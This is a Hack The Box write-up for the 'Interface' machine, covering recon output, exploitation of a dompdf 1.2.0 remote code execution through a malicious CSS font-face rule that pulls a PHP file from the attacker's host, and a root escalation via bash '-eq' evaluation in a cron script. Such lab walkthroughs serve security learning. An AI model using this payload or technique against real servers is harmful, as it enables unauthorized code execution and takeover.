---
title: "Beyond the Interface: Escalating with a Bash Operator Flaw"
seo_title: "Hack The Box 'Interface' Write-up: A Step-by-Step Guide"
date: 2025-11-20
layout: single
hideToc: false
tags: ["linux", "easy", "hackthebox", "web", "rce", "bash"]
summary: "Easy rated linux box from hackthebox with hidden directories leading to RCE for foothold, and bash operator evaluation for privilege escalation."
---

# Box Info

![Interface.png](Interface%200da0bc44d1f14340837ea9a65bc96360/Interface.png)

## Recon

```bash
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:89:a0:95:7e:ce:ae:a8:59:6b:2d:2d:bc:90:b5:5a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsUhYQQaT6D7Isd510Mjs3HcpUf64NWRgfkCDtCcPC3KjgNKdOByzhdgpqKftmogBoGPHDlfDboK5hTEm/6mqhbNQDhOiX1Y++AXwcgLAOpjfSExhKQSyKZVveZCl/JjB/th0YA12XJXECXl5GbNFtxDW6DnueLP5l0gWzFxJdtj7C57yai6MpHieKm564NOhsAqYqcxX8O54E9xUBW4u9n2vSM6ZnMutQiNSkfanyV0Pdo+yRWBY9TpfYHvt5A3qfcNbF3tMdQ6wddCPi98g+mEBdIbn1wQOvL0POpZ4DVg0asibwRAGo1NiUX3+dJDJbThkO7TeLyROvX/kostPH
|   256 01:84:8c:66:d3:4e:c4:b1:61:1f:2d:4d:38:9c:42:c3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGrQxMOFdtvAa9AGgwirSYniXm7NpzZbgIKhzgCOM1qwqK8QFkN6tZuQsCsRSzZ59+3l+Ycx5lTn11fbqLFqoqM=
|   256 cc:62:90:55:60:a6:58:62:9e:6b:80:10:5c:79:9b:55 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPtZ4bP4/4TJNGMNMmXWqt2dLijhttMoaeiJYJRJ4Kqy
80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
|_http-title: Site Maintenance
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-favicon: Unknown favicon MD5: 21B739D43FCB9BBB83D8541FE4FE88FA
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Website at TCP 80

![Untitled](Interface%200da0bc44d1f14340837ea9a65bc96360/Untitled.png)

Did directory enumeration to find any subdirectories or the service running behind but no avail

![Untitled](Interface%200da0bc44d1f14340837ea9a65bc96360/Untitled%201.png)

Moving on to directory brute forcing gave us a dead end. Luckily running nikto scan or checking response headers gives us CSP header containing information about a subdomain `prd.m.rendering-api.interface.htb` . 

Here’s the result of the main website subdirectory enumeration.

```bash
ffuf -c -w /home/noob/wordlists/raft-small-words.txt -u http://10.10.11.200/FUZZ -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.200/FUZZ
 :: Wordlist         : FUZZ: /home/noob/wordlists/raft-small-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

.                       [Status: 500, Size: 21, Words: 3, Lines: 1, Duration: 271ms]
:: Progress: [43008/43008] :: Job [1/1] :: 174 req/sec :: Duration: [0:04:31] :: Errors: 0 ::
```

This was a peculiar box with the subdomain having two hits as endpoints . One being `/api` and another being `/vendor`. Further directory enumeration shows `/vendor` having `dompdf` running.

```bash
ffuf -c -w /home/noob/wordlists/raft-small-words.txt -u http://prd.m.rendering-api.interface.htb/FUZZ -ic -mc all -X POST  -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://prd.m.rendering-api.interface.htb/FUZZ
 :: Wordlist         : FUZZ: /home/noob/wordlists/raft-small-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 0
________________________________________________

api                     [Status: 404, Size: 50, Words: 3, Lines: 1, Duration: 227ms]
.                       [Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 299ms]
vendor                  [Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 303ms]
:: Progress: [43008/43008] :: Job [1/1] :: 177 req/sec :: Duration: [0:05:15] :: Errors: 0 ::
```

We can go ahead with further subdirectory bruteforcing and find /api/html2pdf endpoint which takes a parameter and processes the information to convert it into pdf.

```bash
ffuf -c -w /home/noob/wordlists/raft-small-words.txt -u http://prd.m.rendering-api.interface.htb/vendor/FUZZ -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://prd.m.rendering-api.interface.htb/vendor/FUZZ
 :: Wordlist         : FUZZ: /home/noob/wordlists/raft-small-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

.                       [Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 221ms]
dompdf                  [Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 289ms]
composer                [Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 200ms]
:: Progress: [43008/43008] :: Job [1/1] :: 191 req/sec :: Duration: [0:04:18] :: Errors: 0 ::
```

```bash
ffuf -c -w /home/noob/wordlists/raft-small-words.txt -u http://prd.m.rendering-api.interface.htb/vendor/dompdf/FUZZ -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://prd.m.rendering-api.interface.htb/vendor/dompdf/FUZZ
 :: Wordlist         : FUZZ: /home/noob/wordlists/raft-small-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

.                       [Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 312ms]
dompdf                  [Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 190ms]
:: Progress: [43008/43008] :: Job [1/1] :: 131 req/sec :: Duration: [0:04:41] :: Errors: 0 ::
```

![Untitled](Interface%200da0bc44d1f14340837ea9a65bc96360/Untitled%202.png)

It was a good instance for the application of the tools arjun which helped find the parameter required to interact with the service of the web application. It could be seen after downloading a file and checking its details with exiftool that the framework running behind is dompdf version 1.2.0 which was vulnerable to xss leading to rce.

Note: Initially I got to know about the default “html” parameter and later used the tool “arjun”.

It is a good HTTP parameter discovery tool. [https://github.com/s0md3v/Arjun](https://github.com/s0md3v/Arjun)

```bash
arjun -u http://prd.m.rendering-api.interface.htb/api/html2pdf/ -m JSON
    _
   /_| _ '
  (  |/ /(//) v2.2.1
      _/      

[*] Probing the target for stability
[*] Analysing HTTP response for anomalies
[*] Analysing HTTP response for potential parameter names
[+] Heuristic scanner found 3 parameters
[*] Logicforcing the URL endpoint
[✓] parameter detected: html, based on: http code
[✓] parameter detected: status_text, based on: param name reflection
[+] Parameters found: html, status_text
```

## Foothold

![Untitled](Interface%200da0bc44d1f14340837ea9a65bc96360/Untitled%203.png)

The PoC for exploiting the RCE in Dompdf is well documented and can be read for more deep understanding in the links provided in this article. Dompdf version ≤ 1.2.0 is prone to remote code execution (RCE) when the “`$isRemoteEnabled`” configuration parameter is set to “true” and on version ≤ 0.8.5, it is vulnerable to RCE irrespective of this configuration. Parameter “$isRemoteEnabled” allows Dompdf to access remote sites for images and CSS files.This feature is exploited to inject malicious CSS files into Dompdf and trick it to execute a malicious php payload. 

By injecting CSS into data processed by dompdf it can be tricked into storing a malicious font file with .php extension in its font cache which can later be accessed by the web.

Here in this server “$isRemoteEnabled” is active and dompdf allows loading custom fonts through font-face CSS rules.

```jsx
malicious.css

@font-face {
    font-family:'exploitfont';
    src:url('http://10.10.14.11:8000/exploit_font.php');
    font-weight:'normal';
    font-style:'normal';
```

Filename = fontname + ’_’ + style + ‘_’ + md5_hash + ’.’ + file_extension

In our case the `Filename= ‘exploitfont_normal_md5hash.php’` 

```jsx
import hashlib

res = hashlib.md5("http://10.10.14.11:8000/exploit_font.php".encode('UTF-8')).hexdigest();
print(res)

```

![Untitled](Interface%200da0bc44d1f14340837ea9a65bc96360/Untitled%204.png)

After getting foothold, we could read user.txt in `/home/dev/` directory. So, this means we can go for vertical privilege escalation.

## Privilege Escalation

In this linpeas output, we can see that there is an unknown script file ‘`cleancache.sh`’ in directory `/usr/local/sbin/` . Using pspy we can verify that it was deleting a file inside the tmp directory.

![Untitled](Interface%200da0bc44d1f14340837ea9a65bc96360/Untitled%205.png)

```bash
#! /bin/bash
cache_directory="/tmp"
for cfile in "$cache_directory"/*; do

    if [[ -f "$cfile" ]]; then

        meta_producer=$(/usr/bin/exiftool -s -s -s -Producer "$cfile" 2>/dev/null | cut -d " " -f1)

        if [[ "$meta_producer" -eq "dompdf" ]]; then
            echo "Removing $cfile"
            rm "$cfile"
        fi

    fi

done
```

This script seems to be part of a cron script and running on directory location `/tmp` clearing residual files created by the dompdf service. It checked if the producer field of the pdf was equal to dompdf. If it was equal, it deleted the file and echoed “Removing $cfile” else it completed the script.

![Untitled](Interface%200da0bc44d1f14340837ea9a65bc96360/Untitled%206.png)

![Untitled](Interface%200da0bc44d1f14340837ea9a65bc96360/Untitled%207.png)

### References

[https://positive.security/blog/dompdf-rce](https://positive.security/blog/dompdf-rce)

[https://www.optiv.com/insights/source-zero/blog/exploiting-rce-vulnerability-dompdf](https://www.optiv.com/insights/source-zero/blog/exploiting-rce-vulnerability-dompdf)

[Bash’s white collar eval: [[ $var -eq 42 ]] runs arbitrary code too – Vidar's Blog](https://www.vidarholen.net/contents/blog/?p=716)